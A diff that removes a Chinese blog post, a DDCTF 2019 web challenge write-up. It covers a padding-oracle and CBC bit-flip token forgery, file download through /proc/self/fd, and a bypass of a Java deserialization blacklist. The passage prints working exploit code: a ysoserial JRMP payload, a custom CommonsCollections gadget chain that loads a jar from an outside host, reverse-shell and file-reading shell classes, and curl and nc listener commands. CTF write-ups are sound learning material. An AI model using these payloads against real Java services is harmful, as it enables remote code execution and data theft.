@@ -365,99 +365,14 @@
 
       
         
-          
-            <p>最近有好一段时间没有写blog了,并且很长时间没打CTF了，甚是怀念，然而又一次被DDCTF折磨了一周，嗯，还是JAVA题有意思，并且题目质量非常不错，故写一下解题过程以作纪念。</p>
-<h3 id="0x01-padding-oracle-amp-cbc翻转"><a href="#0x01-padding-oracle-amp-cbc翻转" class="headerlink" title="0x01 padding oracle &amp; cbc翻转"></a>0x01 padding oracle &amp; cbc翻转</h3><p>点开题目之后，发现tis是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">绑定Host访问：</span><br><span class="line"></span><br><span class="line">116.85.48.104 c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com</span><br></pre></td></tr></table></figure>
-<p>不管它，直接浏览器访问，但是发现是404的，好吧，那么把hosts改一下，让这个域名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com</span><br></pre></td></tr></table></figure></p>
-<p>解析成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">116.85.48.104</span><br></pre></td></tr></table></figure></p>
-<p>然后再次回到浏览器刷新一下，就可以发现已经可以访问了，其实背后的原理，应该就是服务器端的nginx做了虚拟host的判断。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/1.png" alt="image"></p>
-<p>接着，对http数据包做一下审查，嗯，可以用chrome看，也可以用burpsuite等等，我这里使用了burpsuite审查流量，可以看到大概有图中那些http请求</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/2.png" alt="image"></p>
-<p>其中有两个api值得关注</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/account_info</span><br><span class="line">&#123;&quot;id&quot;:1,&quot;roleAdmin&quot;:false&#125;</span><br><span class="line"></span><br><span class="line">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token</span><br><span class="line">UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF</span><br></pre></td></tr></table></figure>
-<p>然后再看首页，写着 Try to become an administrator.<br>很明显就是要我们成为admin，做ctf题很关键的地方就是，我们要跟着线索走，要不然就会离真相越来越远。。。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/3.png" alt="image"></p>
-<p>然后关注回http请求数据，对http请求头进行了一下审计，发现其中cookie有一个token，其内容就是/api/gen_token接口返回的token，经过base64解码之后，是一串48byte的字符串，其中前16byte明文显示的是<strong>PadOracle:iv/cbc</strong></p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/4.png" alt="image"><br><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/5.png" alt="image"></p>
-<p>好了，我们继续跟着线索走，根据前16byte以及首页的tis，我猜测要先成为admin，才能拿到下一步的tis，然后根据/api/account_info接口的返回值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;roleAdmin&quot;:false&#125;</span><br></pre></td></tr></table></figure></p>
-<p>我猜测，token的base64 decode后的后32byte应该就是这串json的密文，所以这一步的解题应该就是需要通过Padding Orache得到AES加密过程中每一轮的middle，然后得到原文，最后通过cbc翻转攻击修改iv，使得iv在服务端解密的时候可以解密出我们想要的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;roleAdmin&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/6.png" alt="image"></p>
-<p>然后就是一轮Padding Orache &amp; cbc翻转，其实0-16byte是16-32byte密文的iv，16-32byte是32-48byte的iv，那么我们先爆破16-32byte的middle，然后得到明文，再修改16-32byte的密文，因为它是32-48byte的iv，使得32-48byte的密文在服务端解密的时候能解密成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmin&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>
-<p>因为我们修改了16-32byte的密文，所以我们需要爆破0-16byte的middle并修改0-16byte的iv，使得在16-32byte解密之后的内容和原来一致，最后我们得到的base64的token是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e/0YtlMi8D4jOD4Uk+gE2sO+7uQmXLN5LEM2W9Y6VRa42FqRvernmQhsxyPnvxaF</span><br></pre></td></tr></table></figure></p>
-<p>嗯，这里贴一下大师傅padding oracle的脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【链接】PaddingOracleAttack分析</span><br><span class="line">https://blog.csdn.net/qq_31481187/article/details/71773789</span><br></pre></td></tr></table></figure>
-<p>得到成为admin的token后，我们通过修改cookie的token。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/7.png" alt="image"></p>
-<p>再次回到首页，发现首页已经有所改变。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/8.png" alt="image"></p>
-<p>并且通过一个接口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=1.txt</span><br></pre></td></tr></table></figure></p>
-<p>下载了一个tis文件，内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Try to hack~ </span><br><span class="line">Hint:</span><br><span class="line">1. Env: Springboot + JDK8(openjdk version &quot;1.8.0_181&quot;) + Docker~ </span><br><span class="line">2. You can not exec commands~</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-任意（也不算任意）文件下载"><a href="#0x02-任意（也不算任意）文件下载" class="headerlink" title="0x02 任意（也不算任意）文件下载"></a>0x02 任意（也不算任意）文件下载</h3><p>在上一轮我们通过Padding Orache &amp; cbc翻转成功变成admin之后，我们得到了一个任意文件下载的接口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=1.txt</span><br></pre></td></tr></table></figure></p>
-<p>通过把name修改为/etc/passwd发现的确存在任意文件下，但是不知何原因，好多linux固定路径的文件没办法下载。。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/9.png" alt="image"></p>
-<p>因为我们已经知道了系统环境为docker，那么我们是不是可以试一下下载/proc/fd/self/xxx进程文件描述符文件得到一些重要信息？由于我们并不知道当前运行的Springboot服务的jvm的进程，所以我们尝试通过遍历爆破的方式，最后找到了/proc/self/fd/15，并把下载的文件放到java反编译软件，good，可以看到所有的代码逻辑了。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/10.png" alt="image"><br><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/11.png" alt="image"></p>
-<p>通过阅读反编译的源码，我们可以看到文件下载的接口，其实对一些情况做了限制，这样也就印证了前面为何很多linux固定路径的文件下载不到。</p>
-<h3 id="0x03反序列化源码审计"><a href="#0x03反序列化源码审计" class="headerlink" title="0x03反序列化源码审计"></a>0x03反序列化源码审计</h3><p>在上一轮，我们通过遍历/proc/fd/self/xxx得到了Springboot服务的jar文件，并顺利使用反编译软件看到源码，然后我们看一下fileDownload接口这个Controller的源码以及其调用的Service层的代码，我们可以清醒的看到，其中有一个if判断是判断到文件名称包含有flag字符的都会被过滤掉</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/12.png" alt="image"><br><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/13.png" alt="image"></p>
-<p>然后我们找到了一个反序列化的接口，是根据用户上传参数base64Info的数据进行反序列化</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/14.png" alt="image"></p>
-<p>但是我们可以看到，这里用到的反序列化类是SerialKiller，其中有一个配置文件，对需要反序列化的class做了一个黑名单过滤</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/15.png" alt="image"><br><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/16.png" alt="image"><br><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/17.png" alt="image"></p>
-<p>根据黑名单配置文件，我们可以发现，大多数的class被加入了黑名单，然后我们翻阅ysoserial，可以看到大部分的payload其实都被加入到黑名单了，怎么办呢？这时候突然想起了后来放出的tis：JRMP</p>
-<p>前面也说过了，打ctf就是要跟着线索走，根据JRMP这个线索，发现ysoserial内的JRMPListener以及经过修改的JRMPClient的payload是没有在黑名单内的，那么很明显了，有两个常规思路去突破这个黑名单：</p>
-<ol>
-<li>通过SerialKiller反序列化JRMPListener payload，使得服务端创建一个JRMP服务，然后我们使用JRMPClient连接这个JRMPListener服务并把序列化的payload发送到JRMPListener反序列化，而不通过受限的SerialKiller去反序列化</li>
-<li>首先在公网可以访问的地方创建一个JRMPListener服务，并且这个服务被client连接后，会把序列化payload发送给client。然后我们发送JRMPClient payload到赛题服务的反序列化接口，通过SerialKiller反序列化JRMPClient payload，然后，使得服务端创建一个JRMPClient，并连接到我们公网上部署的JRMPListener服务，最后JRMPListener服务把序列化payload发送到client反序列化，而不通过受限的SerialKiller去反序列化</li>
-</ol>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/18.png" alt="image"><br><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/19.png" alt="image"></p>
-<p>但由于赛题环境是docker环境，肯定是没有暴露多余的端口的，就算有，我们也不好测试到，所以思路2可以否掉了</p>
-<h3 id="0x04-getshell"><a href="#0x04-getshell" class="headerlink" title="0x04 getshell"></a>0x04 getshell</h3><p>在上一轮的分析中，我们已经确定了使用思路1去突破，所以我们需要先准备几样东西</p>
-<ol>
-<li>payload A</li>
-<li>vps</li>
-<li>ysoserial.jar</li>
-</ol>
-<p>payload A：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@SuppressWarnings ( &#123;</span><br><span class="line">    &quot;restriction&quot;</span><br><span class="line">&#125; )</span><br><span class="line">@PayloadTest( harness = &quot;ysoserial.payloads.JRMPReverseConnectSMTest&quot;)</span><br><span class="line">@Authors(&#123; Authors.MBECHLER &#125;)</span><br><span class="line">public class JRMPClient1 extends PayloadRunner implements ObjectPayload&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    public Object getObject ( final String command ) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        int port;</span><br><span class="line">        int sep = command.indexOf(&apos;:&apos;);</span><br><span class="line">        if ( sep &lt; 0 ) &#123;</span><br><span class="line">            port = new Random().nextInt(65535);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            host = command.substring(0, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + 1));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = new ObjID(new Random().nextInt()); // RMI registry</span><br><span class="line">        TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">        return ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main ( final String[] args ) throws Exception &#123;</span><br><span class="line">        String[] xxx = new String[]&#123;&quot;45.123.123.123:44444&quot;&#125;;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient1.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient1.class, xxx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行上面的java代码，生成了利用反序列化启动JRMPClient的payload，并且该JRMPClient会连接上我们公网vps的JRMPListener。</p>
-<p>vps：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 44444 CommonsCollections5 &apos;curl http://xxx.ceye.io&apos;</span><br></pre></td></tr></table></figure>
-<p>把ysoserial.jar扔到vps上，并执行上面的命令。</p>
-<hr>
-<p>最后我们把上面生成的payload A发送到赛题反序列化的接口，然后我们可以观察到vps上出现了连接的log输出，但是好像curl命令并没有运行成功，what？？？根据1.txt的文件tis，难道是命令都被干掉了？验证一下吧！</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/20.png" alt="image"><br><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/21.png" alt="image"></p>
-<p>我们把ysoserial的payload修改成URLDNS，并把URL修改成自己的CEYE DNS解析服务:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 44444 URLDNS &apos;http://xxx.ceye.io&apos;</span><br></pre></td></tr></table></figure>
-<p>然后payload A发送到赛题反序列化的接口，通过查看DNS解析服务，其实可以看到反序列化漏洞是存在的，但是，可能命令被限制了。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/22.png" alt="image"></p>
-<hr>
-<p>既然这样，我们写一个java的webshell去验证一下吧。</p>
-<p>R.jar：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.BufferedWriter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.OutputStreamWriter;</span><br><span class="line">import java.net.Socket;</span><br><span class="line"></span><br><span class="line">public class R &#123;</span><br><span class="line"></span><br><span class="line">    public R(String ip, Integer port) &#123;</span><br><span class="line">        new Thread(() -&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Socket socket = new Socket(ip,port);</span><br><span class="line">                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));</span><br><span class="line">                bufferedWriter.write(&quot;hello ddctf!&quot;);</span><br><span class="line">                bufferedWriter.flush();</span><br><span class="line"></span><br><span class="line">                BufferedReader bufferedReader = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(socket.getInputStream()));</span><br><span class="line">                while (true) &#123;</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line = bufferedReader.readLine()) == null)</span><br><span class="line">                        ;</span><br><span class="line">                    Process pro = Runtime.getRuntime().exec(line);</span><br><span class="line">                    BufferedReader read = new BufferedReader(</span><br><span class="line">                        new InputStreamReader(pro.getInputStream()));</span><br><span class="line">                    String line2 = null;</span><br><span class="line">                    while ((line2 = read.readLine()) != null) &#123;</span><br><span class="line">                        bufferedWriter.write(line2);</span><br><span class="line">                        bufferedWriter.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后在ysoserial加入下面这个payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial.payloads;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import ysoserial.payloads.util.PayloadRunner;</span><br><span class="line">import ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollectionsForLoadJar extends</span><br><span class="line">    PayloadRunner implements ObjectPayload&lt;BadAttributeValueExpException&gt; &#123;</span><br><span class="line">    public BadAttributeValueExpException getObject(final String ipAndHost) throws Exception &#123;</span><br><span class="line">        // http://127.0.0.1:8080/R.jar;127.0.0.1:4444</span><br><span class="line">        String payloadUrl = ipAndHost.substring(0,ipAndHost.indexOf(&quot;;&quot;));</span><br><span class="line"></span><br><span class="line">        String ip2 = ipAndHost.substring(ipAndHost.indexOf(&quot;;&quot;)+1,ipAndHost.lastIndexOf(&quot;:&quot;));</span><br><span class="line">        Integer port2 = Integer.parseInt(ipAndHost.substring(ipAndHost.lastIndexOf(&quot;:&quot;)+1));</span><br><span class="line">        // inert chain for setup</span><br><span class="line">        final Transformer transformerChain = new ChainedTransformer(</span><br><span class="line">            new Transformer[] &#123; new ConstantTransformer(1) &#125;);</span><br><span class="line">        // real chain for after setup</span><br><span class="line">        final Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">            new ConstantTransformer(java.net.URLClassLoader.class),</span><br><span class="line">            // getConstructor class.class classname</span><br><span class="line">            new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line">            new InvokerTransformer(</span><br><span class="line">                &quot;newInstance&quot;,</span><br><span class="line">                new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                new Object[] &#123; new Object[] &#123; new java.net.URL[] &#123; new java.net.URL(</span><br><span class="line">                    payloadUrl) &#125; &#125; &#125;),</span><br><span class="line">            // loadClass String.class R</span><br><span class="line">            new InvokerTransformer(&quot;loadClass&quot;,</span><br><span class="line">                new Class[] &#123; String.class &#125;, new Object[] &#123; &quot;R&quot; &#125;),</span><br><span class="line">            // set the target reverse ip and port</span><br><span class="line">            new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                new Object[] &#123; new Class[] &#123; String.class,Integer.class &#125; &#125;),</span><br><span class="line">            // invoke</span><br><span class="line">            new InvokerTransformer(&quot;newInstance&quot;,</span><br><span class="line">                new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                new Object[] &#123; new Object[] &#123; ip2,port2 &#125; &#125;),</span><br><span class="line">            new ConstantTransformer(1) &#125;;</span><br><span class="line">        final Map innerMap = new HashMap();</span><br><span class="line">        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = new BadAttributeValueExpException(null);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">        valfield.setAccessible(true);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain</span><br><span class="line">        return val;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Constructor&lt;?&gt; getFirstCtor(final String name)</span><br><span class="line">        throws Exception &#123;</span><br><span class="line">        final Constructor&lt;?&gt; ctor = Class.forName(name)</span><br><span class="line">            .getDeclaredConstructors()[0];</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        return ctor;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName)</span><br><span class="line">        throws Exception &#123;</span><br><span class="line">        Field field = clazz.getDeclaredField(fieldName);</span><br><span class="line">        if (field == null &amp;&amp; clazz.getSuperclass() != null) &#123;</span><br><span class="line">            field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        return field;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(final Object obj, final String fieldName,</span><br><span class="line">        final Object value) throws Exception &#123;</span><br><span class="line">        final Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其实这个payload的作用就是，远程load一个jar并实例化R.class，在实例化R.class的时候，会调用R的构造方法，然后我们在构造方法内创建一个指定的tcp连接，通过tcp连接实现一个webshell。</p>
-<p>然后我们把R.jar上传到web服务，也就是可以通过url在公网下载得到，因为我们的payload需要load它，接着我们把修改后的ysoserial.jar放到vps上，并执行以下命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 44444 CommonsCollectionsForLoadJar &quot;http://45.123.123.123/R.jar;45.123.123.123:25678&quot;</span><br><span class="line"></span><br><span class="line">nc -lvv 25678</span><br></pre></td></tr></table></figure>
-<p>再次把payload A发送到赛题反序列化的接口，然后我们可以看到，nc连接上webshell了，然后尝试执行了多个指令，发现无一例外，都被禁用了。</p>
-<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2019-web-writeup/23.png" alt="image"></p>
-<hr>
-<p>发现所有命令都被禁用后，那么唯有通过java去读文件了，然后对R.jar稍微做了一点修改，改成读文件的readFileShell…</p>
-<p>R1.jar</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.BufferedWriter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.OutputStreamWriter;</span><br><span class="line">import java.net.Socket;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class R &#123;</span><br><span class="line"></span><br><span class="line">    public R(String ip, Integer port) &#123;</span><br><span class="line">        new Thread(() -&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Socket socket = new Socket(ip,port);</span><br><span class="line">                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));</span><br><span class="line">                bufferedWriter.write(&quot;hello ddctf!&quot;);</span><br><span class="line">                bufferedWriter.newLine();</span><br><span class="line">                bufferedWriter.flush();</span><br><span class="line"></span><br><span class="line">                BufferedReader bufferedReader = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(socket.getInputStream()));</span><br><span class="line">                while (true) &#123;</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line = bufferedReader.readLine()) == null)</span><br><span class="line">                        ;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        BufferedReader read = new BufferedReader(</span><br><span class="line">                            new InputStreamReader(Files.newInputStream(Paths.get(line.trim()))));</span><br><span class="line">                        String line2 = null;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        while ((line2 = read.readLine()) != null) &#123;</span><br><span class="line">                            bufferedWriter.write(line2);</span><br><span class="line">                            bufferedWriter.newLine();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; catch (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        bufferedWriter.write(&quot;文件不存在&quot;);</span><br><span class="line">                        bufferedWriter.newLine();</span><br><span class="line">                    &#125;</span><br><span class="line">                    